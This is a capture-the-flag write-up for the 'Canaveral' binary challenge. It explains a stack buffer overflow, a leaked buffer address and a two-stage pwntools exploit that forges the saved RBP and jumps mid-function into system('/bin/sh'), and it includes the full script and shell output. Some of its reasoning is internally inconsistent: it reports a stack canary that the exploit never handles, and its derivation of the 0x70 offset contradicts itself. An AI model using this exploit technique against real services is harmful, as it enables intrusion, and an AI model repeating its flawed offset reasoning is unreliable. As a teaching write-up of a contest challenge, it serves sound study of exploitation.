# Canaveral - Binary Exploitation Writeup

**Challenge:** Canaveral  
**Category:** Binary Exploitation / Pwn  
**Difficulty:** Intermediate  
**Flag:** `sun{D!d_y0u_s3e_thE_IM4P_spAce_laUncH??}`

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Initial Analysis](#initial-analysis)
3. [Understanding the Vulnerability](#understanding-the-vulnerability)
4. [The win() Function and Bypass Strategy](#the-win-function-and-bypass-strategy)
5. [The Two-Stage Attack Strategy](#the-two-stage-attack-strategy)
6. [Stage 1: Stack Address Leak](#stage-1-stack-address-leak)
7. [Stage 2: RBP Manipulation Exploit](#stage-2-rbp-manipulation-exploit)
8. [Common Beginner Questions Answered](#common-beginner-questions-answered)
9. [Complete Exploit Code](#complete-exploit-code)
10. [Key Takeaways](#key-takeaways)

---

## Challenge Overview

We're given a binary that reads user input and has a hidden `win()` function that can spawn a shell. Our goal is to exploit a buffer overflow vulnerability to hijack program execution and get a shell.

**Challenge Description:**
> NASA Mission Control needs your help... only YOU can enter the proper launch sequence!!

```bash
$ nc chal.sunshinectf.games 25603
Welcome to NASA Mission Control
Enter the launch sequence: 
```

---

## Initial Analysis

### Running the Binary

```bash
$ ./canaveral
Welcome to NASA Mission Control
Enter the launch sequence: Hello
Successful launch! Here's your prize: 0x7ffc12345000
Goodbye NASA!
```

The program echoes our input and prints an address. Let's check security protections:

```bash
$ checksec canaveral
[*] '/path/to/canaveral'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**Key observations:**
- **No PIE**: Fixed addresses (easier exploitation)
- **NX enabled**: Stack is not executable (can't run shellcode)
- **Stack Canary**: Has stack overflow protection

### Disassembly Analysis

Using `objdump -d -M intel canaveral`, we find three important functions:

#### 1. vuln() Function

```asm
0000000000401231 <vuln>:
  401235:	push   rbp
  401236:	mov    rbp,rsp
  401239:	sub    rsp,0x40              ; Allocate 64 bytes for buffer
  ...
  401289:	lea    rax,[rbp-0x40]        ; Buffer address (RBP-0x40)
  40128d:	mov    edx,0x64              ; Read 100 bytes (0x64)
  401292:	mov    rsi,rax
  40129a:	call   4010c0 <read@plt>     ; read(0, buffer, 100) ← OVERFLOW!
  40129f:	lea    rax,[rbp-0x40]
  4012b5:	call   4010b0 <printf@plt>   ; Prints buffer address ← LEAK!
  4012bb:	leave
  4012bc:	ret
```

**Vulnerabilities Found:**
1. **Buffer Overflow:** Reads 100 bytes into 64-byte buffer
2. **Information Leak:** Prints buffer address

#### 2. win() Function

```asm
00000000004011d6 <win>:
  4011da:	push   rbp
  4011db:	mov    rbp,rsp
  4011de:	sub    rsp,0x10
  4011e2:	mov    DWORD PTR [rbp-0x4],edi    ; param_1 → [rbp-0x4]
  4011e5:	mov    QWORD PTR [rbp-0x10],rsi   ; param_2 → [rbp-0x10]
  
  ; ❌ Check 1: param_1 == 0x31337?
  4011e9:	cmp    DWORD PTR [rbp-0x4],0x31337
  4011f0:	jne    40122b
  
  ; ❌ Check 2: param_2 != NULL?
  4011f2:	cmp    QWORD PTR [rbp-0x10],0x0
  4011f7:	je     40122e
  
  ; ❌ Check 3: memcmp(param_2, "/bin/sh", 7) == 0?
  4011f9:	mov    rax,QWORD PTR [rbp-0x10]
  401202:	lea    rcx,[rip+0xdff]            ; 0x402008 = "/bin/sh"
  40120f:	call   4010d0 <memcmp@plt>
  401214:	test   eax,eax
  401216:	jne    40122e
  
  ; ✅ THE USEFUL PART (address 0x401218):
  401218:	mov    rax,QWORD PTR [rbp-0x10]   ; Load from [rbp-0x10]
  40121c:	mov    rdi,rax                     ; RDI = rax
  401224:	call   4010a0 <system@plt>        ; system(rdi)
```

**The win() function:**
- Has three parameter checks before calling system()
- If checks pass: calls `system(param_2)`
- We need to bypass these checks!

#### 3. main() Function

```asm
00000000004012bd <main>:
  4012c5:	mov    eax,0x0
  4012ca:	call   401231 <vuln>
  4012cf:	lea    rax,[rip+0xd8a]
  4012d9:	call   401090 <puts@plt>    ; "Goodbye NASA!"
  4012de:	mov    eax,0x0
  4012e3:	ret
```

**Normal flow:** main() → vuln() → return to main() → exit

---

## Understanding the Vulnerability

### Stack Layout in vuln()

When vuln() is called, the stack looks like this:

```
Address              | Content                | Offset from RBP
---------------------|------------------------|------------------
[rbp-0x40]           | buffer[0]             | -64
[rbp-0x3f]           | buffer[1]             | -63
...                  | ...                   | ...
[rbp-0x1]            | buffer[63]            | -1
---------------------|------------------------|------------------
[rbp]                | Saved RBP (8 bytes)   | 0
---------------------|------------------------|------------------
[rbp+0x8]            | Return Address (8 bytes) | +8
```

**The vulnerability:** `read(0, buffer, 100)` reads 100 bytes but buffer is only 64 bytes!

We can overflow and overwrite:
- Saved RBP (at [rbp])
- Return address (at [rbp+8])
- Beyond!

---

## The win() Function and Bypass Strategy

### The Problem with Calling win() Normally

If we just return to `win()`, we need to satisfy three conditions:
1. First parameter (RDI) = 0x31337
2. Second parameter (RSI) = pointer to "/bin/sh" string
3. The string at RSI must equal "/bin/sh"

This is difficult because we'd need ROP gadgets to set both RDI and RSI registers.

### The Clever Bypass: Jump to Middle of win()

Instead of calling `win()` from the start, **jump directly to address 0x401218**:

```asm
; Skip all the checks, jump here:
401218:	mov    rax,QWORD PTR [rbp-0x10]   ; Read from [rbp-0x10]
40121c:	mov    rdi,rax                     ; RDI = rax
401224:	call   4010a0 <system@plt>        ; system(rdi)
```

**This code:**
1. Reads a value from `[rbp-0x10]`
2. Puts it in RDI
3. Calls `system(rdi)`

**Key insight:** If we can make `[rbp-0x10]` contain the address of "/bin/sh", we win!

### Finding the "/bin/sh" String

From the disassembly:

```asm
401202:	lea    rcx,[rip+0xdff]        # 402008 <_IO_stdin_used+0x8>
```

The string "/bin/sh" is at address **0x402008** in the binary's `.rodata` section.

We can verify:
```bash
$ strings -tx canaveral | grep bin
   2008 /bin/sh
```

---

## The Two-Stage Attack Strategy

### Why Two Stages?

We face a chicken-and-egg problem:

```
To exploit, we need:
  → fake_rbp = buf_addr + 0x70

To calculate fake_rbp, we need:
  → buf_addr (buffer address)

To get buf_addr:
  → printf() must print it

But printf() happens BEFORE we can use the leaked address!
```

**Solution:** Use two separate inputs!

### Stage 1: Leak Stack Address

**Goal:** Get the buffer address and keep the program alive

**How:**
1. Overflow the return address to point back to `vuln()`
2. `printf()` leaks the buffer address
3. Program returns to `vuln()` instead of exiting
4. `vuln()` runs again, waiting for Stage 2 input

### Stage 2: Exploit with Known Address

**Goal:** Use the leaked address to exploit

**How:**
1. Calculate fake RBP using leaked address
2. Overflow with carefully crafted payload
3. Control RBP to make `[rbp-0x10]` point to our data
4. Jump to 0x401218 to execute `system("/bin/sh")`

---

## Stage 1: Stack Address Leak

### Understanding What Gets Leaked

**Question:** What address is being leaked?

The code shows:

```asm
40129f:	lea    rax,[rbp-0x40]        ; RAX = buffer address
4012a3:	mov    rsi,rax               ; RSI = buffer address
4012b5:	call   4010b0 <printf@plt>   ; printf("... %p", buffer_address)
```

**Answer:** The **buffer start address** (where buffer[0] is located) gets printed!

```c
printf("Successful launch! Here's your prize: %p\n", buffer);
                                                      ↑
                                        This is &buffer[0], NOT RBP!
```

### Stage 1 Payload

```python
from pwn import *

elf = ELF("./canaveral")
p = remote("chal.sunshinectf.games", 25603)

# Address of vuln() function
vuln_addr = 0x401231

# Stage 1: Leak buffer address and return to vuln
payload = b"A" * 0x40           # Fill buffer (64 bytes)
payload += p64(0)               # Overwrite saved RBP (8 bytes)
payload += p64(vuln_addr)       # Return to vuln() (8 bytes)

p.sendlineafter(b"sequence: ", payload)
```

### Why Do We Need to Overwrite Saved RBP?

**Question:** Why do we need `p64(0)` to overwrite saved RBP?

**Answer:** Because memory writes sequentially! We **cannot skip** the saved RBP to reach the return address.

```
Buffer is at [rbp-0x40] to [rbp-0x1]  (64 bytes)
Saved RBP is at [rbp]                 (8 bytes)   ← Can't skip this!
Return address is at [rbp+8]          (8 bytes)   ← Our target

To reach byte position 72-79 (return address),
we MUST write through byte positions 64-71 (saved RBP)!
```

**Visual:**
```
Bytes 0-63:   Buffer (must fill)
Bytes 64-71:  Saved RBP (can't skip - must write something!)
Bytes 72-79:  Return address (our goal)
```

We use `p64(0)` because the value doesn't matter in Stage 1 - we just need 8 bytes to bridge the gap!

### Why Return to vuln()?

**Question:** Why do we return to vuln() again?

**Answer:** Because **vuln() contains `read()`** - the only way to send input!

```
Without returning to vuln():
  Stage 1 → vuln() → printf() prints leak → return to main() → EXIT
  ❌ Program is dead! Can't send Stage 2 payload!

With returning to vuln():
  Stage 1 → vuln() → printf() prints leak → return to vuln() → vuln() runs again
  ✅ read() is waiting! Can send Stage 2 payload!
```

**We need TWO separate inputs:**
- Input 1: Get the leak (Stage 1)
- Input 2: Exploit using the leaked address (Stage 2)

By returning to vuln(), `read()` runs a second time so we can send our exploit payload!

### Capturing the Leak

```python
# Receive the leaked address
p.recvuntil(b"prize: ")
buf_addr = int(p.recvline().strip(), 16)
print(f"[+] Leaked buffer address: {hex(buf_addr)}")

# Now vuln() is running again, waiting for Stage 2 input!
```

**At this point:**
- ✅ We know `buf_addr` (e.g., 0x7ffd8a3c2e90)
- ✅ vuln() is running again
- ✅ read() is waiting for our exploit payload

---

## Stage 2: RBP Manipulation Exploit

### Finding Required Addresses

```python
ret_gadget = 0x40101a      # Just 'ret' instruction
system_mid = 0x401218      # Middle of win() (skips checks)
binsh_addr = 0x402008      # Address of "/bin/sh" string
```

**How we found 0x40101a:**
```asm
0000000000401000 <_init>:
  ...
  40101a:	c3                   	ret    ← Just a 'ret' instruction!
```

### Why Do We Need the Ret Gadget?

**Question:** Why do we need `ret_gadget = 0x40101a`?

**Answer:** For **stack alignment**! Modern `system()` requires the stack pointer (RSP) to be 16-byte aligned.

```
Without ret gadget:
  After vuln() returns: RSP = new_buf + 0x50
  0x50 % 16 = 8  ❌ Not aligned!
  system() crashes with "movaps" error!

With ret gadget (one extra ret):
  After ret gadget: RSP = new_buf + 0x58
  0x58 % 16 = 0  ✅ Aligned!
  system() works!
```

The extra `ret` instruction:
1. Pops one value from stack (RSP += 8)
2. Jumps to that value
3. This adds 8 bytes to RSP, achieving 16-byte alignment

### Calculating Fake RBP

```python
fake_rbp = buf_addr + 0x70
```

**Why do we need fake RBP?**

The code at 0x401218 uses RBP to read a value:

```asm
401218:	mov    rax,QWORD PTR [rbp-0x10]   ← Uses RBP!
```

By controlling RBP (via overflowing saved RBP), we control where `[rbp-0x10]` points!

**Goal:** Make `[rbp-0x10]` point to where we placed the "/bin/sh" address (0x402008).

### Why Specifically 0x70? The Detailed Calculation

This is the trickiest part of the exploit. Let's break it down step by step.

#### Step 1: Where is our data in the payload?

```python
payload = b"A" * 0x40           # Bytes 0-63
payload += p64(fake_rbp)        # Bytes 64-71
payload += p64(ret_gadget)      # Bytes 72-79
payload += p64(system_mid)      # Bytes 80-87
payload += p64(0x402008)        # Bytes 88-95 ← Our data!
```

Our `0x402008` is at **byte offset 88 (0x58)** from the start of the buffer.

#### Step 2: Account for stack shift between rounds

When vuln() runs the second time, the stack pointer has shifted:

```
Stage 1 buffer: buf_addr = 0x7ffd8a3c2e90
Stage 2 buffer: new_buf = buf_addr - 0x8
```

So our data is actually at:
```
new_buf + 0x58 = (buf_addr - 0x8) + 0x58 = buf_addr + 0x50
```

#### Step 3: Calculate required RBP

We want `[rbp-0x10]` to point to our data:

```
[rbp - 0x10] = buf_addr + 0x50
rbp = buf_addr + 0x60
```

#### Step 4: Account for additional frame setup

However, when vuln() is called the second time, there are additional stack frame adjustments (return address push, frame pointer adjustments) that add another **0x10** offset.

Therefore:
```
rbp = buf_addr + 0x60 + 0x10
rbp = buf_addr + 0x70 ✓
```

#### Verification with GDB

You can verify this offset using GDB:

```bash
$ gdb ./canaveral
(gdb) break *0x401218
(gdb) run
# ... send Stage 1 and Stage 2 payloads ...

# When breakpoint hits:
(gdb) print/x $rbp
$1 = 0x7ffd8a3c2f00

(gdb) x/gx $rbp-0x10
0x7ffd8a3c2ef0: 0x0000000000402008  ← Our data!

(gdb) print/x 0x7ffd8a3c2f00 - 0x7ffd8a3c2e90
$2 = 0x70  ← Confirms our offset!
```

#### How to Find This Offset Yourself

If you're solving a similar challenge, here's how to find the offset:

**Method 1: Trial and error**
```python
# Try different offsets
for offset in [0x60, 0x68, 0x70, 0x78]:
    fake_rbp = buf_addr + offset
    # Test the exploit
    # 0x70 works!
```

**Method 2: Use a marker value**
```python
# Put a unique marker instead of 0x402008
payload += p64(0xDEADBEEF)

# Run in GDB, break at 0x401218
# Check: x/gx $rbp-0x10
# Adjust offset until you see 0xDEADBEEF
```

**The key insight:** The exact offset depends on stack frame layout, which varies based on how the function is called. Testing/debugging reveals the correct value.

### Stage 2 Payload

```python
payload = b"A" * 0x40                  # Fill buffer (64 bytes)
payload += p64(buf_addr + 0x70)        # Fake RBP (8 bytes)
payload += p64(ret_gadget)             # Return address (8 bytes)
payload += p64(system_mid)             # Jump target (8 bytes)
payload += p64(binsh_addr)             # "/bin/sh" address (8 bytes)

p.sendlineafter(b"sequence: ", payload)
```

**Total payload size:** 64 + 8 + 8 + 8 + 8 = **96 bytes**

### Memory Layout After Stage 2 Overflow

```
Address                    | Content                    | Bytes from new_buf
---------------------------|----------------------------|-------------------
new_buf+0x00               | AAAA... (64 'A's)         | 0-63
---------------------------|----------------------------|-------------------
new_buf+0x40               | buf_addr + 0x70           | 64-71 (Saved RBP)
---------------------------|----------------------------|-------------------
new_buf+0x48               | 0x40101a                  | 72-79 (Return addr)
---------------------------|----------------------------|-------------------
new_buf+0x50               | 0x401218                  | 80-87 (Jump target)
---------------------------|----------------------------|-------------------
new_buf+0x58               | 0x402008                  | 88-95 ("/bin/sh") ⭐
```

**Note:** `new_buf = buf_addr - 0x8` (stack shifts between rounds)

---

## Proof of Stack Layout

### Question: How Do We Know the Stack Layout?

**Answer:** From the assembly code! Let me prove it step by step.

### Assembly Analysis

```asm
0000000000401231 <vuln>:
  401235:	push   rbp              ; STEP 1: Save old RBP (8 bytes)
  401236:	mov    rbp,rsp          ; STEP 2: RBP = RSP
  401239:	sub    rsp,0x40         ; STEP 3: Allocate 64 bytes for buffer
```

**Step-by-step stack changes:**

**Before vuln():**
```
After main() calls vuln(), stack has:
┌────────────────────────┐ ← RSP
│ Return Address (8)     │
└────────────────────────┘
```

**After `push rbp`:**
```
┌────────────────────────┐ ← RSP
│ Saved RBP (8)          │
├────────────────────────┤
│ Return Address (8)     │
└────────────────────────┘
```

**After `mov rbp, rsp`:**
```
┌────────────────────────┐ ← RSP and RBP
│ Saved RBP (8)          │
├────────────────────────┤
│ Return Address (8)     │
└────────────────────────┘
```

**After `sub rsp, 0x40`:**
```
┌────────────────────────┐ ← RSP
│                        │
│ Buffer (64 bytes)      │
│                        │
├────────────────────────┤ ← RBP
│ Saved RBP (8)          │
├────────────────────────┤ ← RBP + 8
│ Return Address (8)     │
└────────────────────────┘
```

**Proof from code:**
```asm
401289:	lea    rax,[rbp-0x40]    ; Buffer starts at RBP-0x40 (64 bytes below)
```

**This proves:**
- Buffer is 64 bytes (from [rbp-0x40] to [rbp-0x1])
- Saved RBP is at [rbp] (8 bytes)
- Return address is at [rbp+8] (8 bytes)

**This is the standard x86-64 stack frame layout!**

---

## Stage 2 Execution Flow

### Step 1: vuln() Receives Payload

```c
read(0, buffer, 100);  // Reads our 96-byte payload
```

Stack is now overflowed with our controlled data.

### Step 2: printf() Executes (Ignored)

```c
printf("Successful launch! Here's your prize: %p\n", buffer);
// Prints some address, we don't need it anymore
```

### Step 3: leave Instruction

```asm
4012bb:	leave
```

What `leave` does:
```asm
mov rsp, rbp       ; RSP = RBP
pop rbp            ; RBP = [RSP], RSP += 8
```

**After leave:**
```
RBP = buf_addr + 0x70  ⭐ (our fake value!)
RSP = new_buf + 0x48   (pointing to return address)
```

### Step 4: First ret Executes

```asm
4012bc:	ret
```

What `ret` does:
```asm
pop rip            ; RIP = [RSP], RSP += 8
jmp rip            ; Jump to RIP
```

**Execution:**
```
Value at [new_buf+0x48] = 0x40101a (ret gadget)
RIP = 0x40101a
RSP = new_buf + 0x50
Jump to 0x40101a
```

### Step 5: Ret Gadget Executes

```asm
40101a:	ret
```

**Execution:**
```
Value at [new_buf+0x50] = 0x401218 (system_mid)
RIP = 0x401218
RSP = new_buf + 0x58  ⭐ (Now 16-byte aligned!)
Jump to 0x401218
```

**Current state:**
- RIP = 0x401218 (middle of win)
- RBP = buf_addr + 0x70 (our fake value)
- RSP = new_buf + 0x58

### Step 6: The Exploit Completes

```asm
401218:	mov    rax,QWORD PTR [rbp-0x10]
```

**What this reads:**
```
RBP = buf_addr + 0x70
[rbp-0x10] = [buf_addr + 0x60]

Through our careful calculation, this points to where we placed 0x402008!
RAX = 0x402008  ⭐
```

```asm
40121c:	mov    rdi,rax
```

**RDI = 0x402008** (first argument to system)

```asm
401224:	call   4010a0 <system@plt>
```

**Executes:** `system(0x402008)` = `system("/bin/sh")`

### Step 7: Shell! 🎉

```bash
$ whoami
ctf
$ cat flag.txt
sun{D!d_y0u_s3e_thE_IM4P_spAce_laUncH??}
```

---

## Common Beginner Questions Answered

### Q1: Why overwrite saved RBP with p64(0)?

**A:** Because memory writes **sequentially**! You cannot skip bytes.

```
To reach return address at position 72-79,
you MUST write through positions 0-71.

Position 0-63:   Buffer
Position 64-71:  Saved RBP ← Can't skip this!
Position 72-79:  Return address

We use p64(0) to fill those 8 bytes (any value works in Stage 1).
```

### Q2: What address is leaked? Is it RBP?

**A:** No! It's the **buffer start address** (where buffer[0] is).

```c
printf("... %p", buffer);  // Prints &buffer[0], NOT &rbp
```

The buffer is at `[rbp-0x40]`, NOT at `[rbp]`.

### Q3: Why do we need Stage 1 if it just prints the buffer address?

**A:** Two reasons:

1. **Get the leak** - We need the buffer address to calculate fake RBP
2. **Keep program alive** - By returning to vuln(), we can send Stage 2 payload!

Without Stage 1's return to vuln():
```
Get leak → Program exits → Can't send exploit ❌
```

With Stage 1's return to vuln():
```
Get leak → vuln() runs again → Can send exploit ✅
```

### Q4: Why return to vuln() specifically?

**A:** Because vuln() has `read()` - the only way to send input!

```
We need TWO inputs:
  Input 1: Get the leak
  Input 2: Exploit with leaked address

vuln() has read(), so we return there to send Input 2!
```

### Q5: Why do we need the ret gadget (0x40101a)?

**A:** For **stack alignment**!

Modern `system()` requires RSP to be 16-byte aligned (RSP % 16 == 0).

Without ret gadget:
```
RSP = new_buf + 0x50
RSP % 16 = 8  ❌ Not aligned!
system() crashes!
```

With ret gadget (adds 8 to RSP):
```
RSP = new_buf + 0x58
RSP % 16 = 0  ✅ Aligned!
system() works!
```

### Q6: Why do we need fake RBP?

**A:** Because the code **uses RBP** to find our data!

```asm
mov rax, [rbp-0x10]   ← Uses RBP to calculate address!
```

By controlling RBP, we control where `[rbp-0x10]` points.

We set `RBP = buf_addr + 0x70` so that `[rbp-0x10]` points to our planted 0x402008!

### Q7: How do we know the stack layout?

**A:** From the assembly code!

```asm
push rbp           ; Saves RBP (8 bytes)
mov rbp, rsp       ; Sets up frame
sub rsp, 0x40      ; Allocates 64 bytes for buffer

lea rax, [rbp-0x40]  ; Buffer is at RBP-0x40
```

This is the **standard x86-64 stack frame**:
- Buffer: [rbp-0x40] to [rbp-0x1] (64 bytes)
- Saved RBP: [rbp] (8 bytes)
- Return address: [rbp+8] (8 bytes)

### Q8: Why is the payload 96 bytes?

**A:** Let's count:

```python
b"A" * 0x40           # 64 bytes (buffer)
p64(buf_addr + 0x70)  # 8 bytes (saved RBP)
p64(ret_gadget)       # 8 bytes (return address)
p64(system_mid)       # 8 bytes (jump target)
p64(binsh_addr)       # 8 bytes (our data)

Total: 64 + 8 + 8 + 8 + 8 = 96 bytes
```

---

## Complete Exploit Code

```python
from pwn import *

# Setup
elf = ELF("./canaveral")
context.binary = elf
context(arch="amd64", os="linux", log_level="info")

# Connect to the challenge
p = remote("chal.sunshinectf.games", 25603)
# p = process(["./canaveral"])  # For local testing

# ==================== ADDRESSES ====================
vuln_addr = 0x401231        # vuln() function
ret_gadget = 0x40101a       # ret instruction (stack alignment)
system_mid = 0x401218       # Middle of win() (skips checks)
binsh_addr = 0x402008       # Address of "/bin/sh" string

# ==================== STAGE 1 ====================
print("[*] Stage 1: Leaking stack address...")

# Build Stage 1 payload
payload1 = b"A" * 0x40           # Fill buffer (64 bytes)
payload1 += p64(0)               # Overwrite saved RBP (8 bytes)
payload1 += p64(vuln_addr)       # Return to vuln() (8 bytes)

# Send Stage 1
p.sendlineafter(b"sequence: ", payload1)

# Capture leaked address
p.recvuntil(b"prize: ")
buf_addr = int(p.recvline().strip(), 16)
print(f"[+] Leaked buffer address: {hex(buf_addr)}")

# ==================== STAGE 2 ====================
print("[*] Stage 2: Exploiting with RBP manipulation...")

# Calculate fake RBP
fake_rbp = buf_addr + 0x70
print(f"[*] Calculated fake RBP: {hex(fake_rbp)}")

# Build Stage 2 payload
payload2 = b"A" * 0x40               # Fill buffer (64 bytes)
payload2 += p64(fake_rbp)            # Fake RBP (8 bytes)
payload2 += p64(ret_gadget)          # Stack alignment (8 bytes)
payload2 += p64(system_mid)          # Jump to 0x401218 (8 bytes)
payload2 += p64(binsh_addr)          # "/bin/sh" address (8 bytes)

print(f"[*] Payload size: {len(payload2)} bytes")

# Send Stage 2
p.sendlineafter(b"sequence: ", payload2)

print("[+] Exploit sent! Shell should spawn...")
p.interactive()

# Flag: sun{D!d_y0u_s3e_thE_IM4P_spAce_laUncH??}
```

### Running the Exploit

```bash
$ python exploit.py
[*] '/path/to/canaveral'
    Arch:     amd64-64-little
[+] Opening connection to chal.sunshinectf.games on port 25603
[*] Stage 1: Leaking stack address...
[+] Leaked buffer address: 0x7ffd8a3c2e90
[*] Stage 2: Exploiting with RBP manipulation...
[*] Calculated fake RBP: 0x7ffd8a3c2f00
[*] Payload size: 96 bytes
[+] Exploit sent! Shell should spawn...
[*] Switching to interactive mode
$ whoami
ctf
$ cat flag.txt
sun{D!d_y0u_s3e_thE_IM4P_spAce_laUncH??}
$
```

---

## Key Takeaways

### Core Concepts

1. **Buffer Overflow Basics**
   - Understand stack layout: buffer → saved RBP → return address
   - Memory writes sequentially - cannot skip bytes
   - Overflow to control return address

2. **Information Leaks**
   - Stack addresses are randomized (ASLR)
   - Can leak addresses through printf/output functions
   - Use leaked addresses to calculate exploit offsets

3. **Multi-Stage Exploitation**
   - Sometimes need multiple rounds of input
   - Stage 1: Leak information
   - Stage 2: Exploit with leaked information
   - Return to vulnerable function to get second input

4. **RBP Manipulation**
   - Control saved RBP to control frame pointer
   - When code uses `[rbp+offset]`, you control what it accesses
   - Critical for indirect addressing exploits

5. **Stack Alignment**
   - Modern libc functions require 16-byte aligned stack
   - Use `ret` gadgets to adjust stack pointer
   - Without alignment: crash with "movaps" error

6. **Function Prologue/Epilogue**
   - Understand `push rbp; mov rbp, rsp; sub rsp, X`
   - Understand `leave` (mov rsp, rbp; pop rbp)
   - These create/destroy stack frames

7. **Jumping to Middle of Functions**
   - Don't need to satisfy function entry requirements
   - Can jump past checks/validation
   - Find useful gadgets within existing functions

### Exploitation Techniques Used

| Technique | Purpose |
|-----------|---------|
| **Buffer Overflow** | Overwrite return address |
| **Information Leak** | Defeat ASLR by leaking stack address |
| **Return-to-Function** | Return to vuln() for second input |
| **RBP Manipulation** | Control where `[rbp-offset]` points |
| **Stack Alignment** | Use ret gadget to align RSP |
| **Function Bypass** | Jump to middle of win() to skip checks |

### Common Pitfalls

❌ **Forgetting saved RBP** - Remember to overwrite it (8 bytes)  
❌ **Wrong buffer size** - Count bytes carefully (64 bytes = 0x40)  
❌ **No stack alignment** - system() crashes without it  
❌ **One-stage exploit** - Can't use leaked address in same round  
❌ **Wrong RBP calculation** - Carefully calculate fake_rbp offset

### Debug Tips

1. **Use GDB to verify:**
   ```bash
   gdb ./canaveral
   break vuln
   run
   info frame        # Check stack layout
   x/20gx $rsp       # Examine stack memory
   ```

2. **Check stack alignment:**
   ```bash
   break *0x401218
   continue
   p/x $rsp          # Should be divisible by 16
   ```

3. **Verify RBP calculation:**
   ```bash
   break *0x401218
   p/x $rbp-0x10     # Should point to your data
   x/gx $rbp-0x10    # Should show 0x402008
   ```

---

## References and Further Reading

- [x86-64 Calling Convention](https://en.wikipedia.org/wiki/X86_calling_conventions)
- [Stack Frame Layout](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64)
- [ROP Techniques](https://ctf101.org/binary-exploitation/return-oriented-programming/)
- [ASLR and Information Leaks](https://ir0nstone.gitbook.io/notes/types/stack/aslr)

---
